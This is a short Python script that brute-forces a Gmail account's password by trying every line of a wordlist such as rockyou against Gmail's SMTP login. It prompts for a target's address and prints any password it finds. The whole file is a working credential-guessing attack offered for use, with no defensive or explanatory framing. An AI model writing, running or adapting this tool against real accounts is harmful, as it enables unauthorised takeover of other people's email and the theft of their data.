import smtplib
from colorama import init
from termcolor import colored
init()

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("[*] Enter Targets Email Address: ")
passwfile = input("[*] Enter The Path To The Password File: ")
file = open(passwfile, "r")

for password in file:
    password = password.strip('\n')
    try:
        smtpserver.login(user, password)
        print(colored("[+] Password Found: %s" % password, 'green'))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored("[-] Wrong Password: " + password, 'red', 'on_grey'))


# User: ******@gmail.com
# Passlist: wordlist_rockyou.txt, passlist.txt
